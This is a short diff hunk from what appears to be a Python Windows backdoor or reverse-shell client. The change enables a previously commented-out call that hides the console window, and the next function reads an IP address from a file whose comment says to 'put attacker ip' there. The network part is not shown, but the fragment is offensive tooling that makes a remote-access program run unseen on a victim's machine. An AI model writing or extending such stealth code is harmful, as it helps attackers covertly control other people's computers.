@@ -9,7 +9,7 @@ def hiden(): # Hide console
     win = win32console.GetConsoleWindow()
     win32gui.ShowWindow(win, 0)
 
-#hiden()
+hiden()
 
 def read(): #read ip.txt (first line)
      read=open("ip.txt", "r") # put attacker ip in ip.txt
